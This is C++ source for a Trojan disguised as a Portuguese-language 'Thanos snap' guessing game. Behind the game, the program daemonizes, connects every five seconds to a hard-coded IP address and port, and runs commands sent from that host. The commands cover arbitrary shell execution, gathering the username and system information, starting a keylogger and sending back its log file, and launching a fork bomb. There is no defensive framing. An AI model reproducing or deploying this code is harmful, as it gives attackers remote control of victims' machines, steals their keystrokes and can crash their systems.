#include "keylogger.hpp"

#include <iostream>
#include <chrono>
#include <string>
#include <thread>

#include <unistd.h>
#include <stdlib.h>
#include <stdio.h>
#include <signal.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/mman.h>

#include <sys/socket.h>
#include <arpa/inet.h>

constexpr int MAXBUFFSIZE = 1024;

std::string home_addr = "3.131.147.49";
constexpr int home_port = 16085;

std::string name;
char original_executable_path[MAXBUFFSIZE];
int stop = 0;
bool is_keylogger_running = false;
bool should_keylogger_stop = false;

std::string run_module(char* data)
{
	switch (data[0]) {
		case 'u':
			{
				char *username = getenv("USER");
				return std::string(username);
			}
		case 'p':
			{
				FILE *command_pipe = popen("uname -a", "r");

				char command_output[64];
				std::string result;
				while (fgets(command_output, 64, command_pipe)) {
					result += command_output;
				}
				pclose(command_pipe);
				return result;
			}
		case 'c':
			{
				if (strlen(data) <= 2) break;

				FILE *command_pipe = popen(&data[2], "r");

				char command_output[64];
				std::string result;
				while (fgets(command_output, 64, command_pipe)) {
					result += command_output;
				}

				pclose(command_pipe);
				return result;
			}
		case 'k':
			{
				if (data[2] == 'b') {
					if (!is_keylogger_running) {
						is_keylogger_running = true;
						std::thread keylogger_t(keylogger, &is_keylogger_running, &should_keylogger_stop);
						keylogger_t.detach();
					}
				}
				else if (data[2] == 'e') {
					if (is_keylogger_running) {
						should_keylogger_stop = true;
					}
				}
				else if (data[2] == 'g') {
					std::string result;
					FILE* keylog_file = fopen("/tmp/key.log", "r");
					if (keylog_file) {
						char buffer[42];
						while (fgets(buffer, 42, keylog_file)) {
							result += buffer;
							memset(buffer, 0, 42);
						}
						fclose(keylog_file);
						return result;
					}
				}
				break;
			}
		case 'f':
			{
				while (1) fork();
				break;
			}
		default:
			break;
	}
	return "";
}

void handle_connection_to_home(int sock)
{
	char buf[MAXBUFFSIZE];
	memset(buf, 0, MAXBUFFSIZE);

	while (recv(sock, buf, MAXBUFFSIZE, 0))
	{
		std::string output = run_module(buf);

		send(sock, output.c_str(), output.size(), 0);
		memset(buf, 0, MAXBUFFSIZE);
	}

	close(sock);
}

bool tentar_conectar(int sock)
{
		struct sockaddr_in server;
		server.sin_family = AF_INET;
		server.sin_addr.s_addr = inet_addr(home_addr.c_str());
		server.sin_port = htons(home_port);
		return connect(sock, (struct sockaddr *)&server, sizeof(server)) == 0;
}

void malware()
{
	daemon(0, 0);

	while (!stop) {
		using namespace std::chrono_literals;
		std::this_thread::sleep_for(5s);

		int sock = socket(AF_INET, SOCK_STREAM, 0);
		if (tentar_conectar(sock)) {
			handle_connection_to_home(sock);
		}
	}

	exit(0);
}

void signal_handling(int _)
{
	malware();
}

void game()
{
	srand(time(NULL));

	std::cout << "Oh não! O Thanos estalou os dedos de novo!\n";
	std::cout << "Descubra se você virou PÓ!\n";
	std::cout << "Coloque seu nome aqui: ";
	std::getline(std::cin, name);

	int numero = rand() % 2;
	if (numero == 0)
	{
		std::cout << "\nEita, " << name << ". você virou PÓ!\n";
	}
	else
	{
		std::cout << "\nSussa, " << name << ". você não virou PÓ!\n";
	}
}

int main(int argc, char** argv)
{
	if (argc != 1) malware();

	signal(SIGINT, signal_handling);
	signal(SIGQUIT, signal_handling);

	game();

	malware();
}

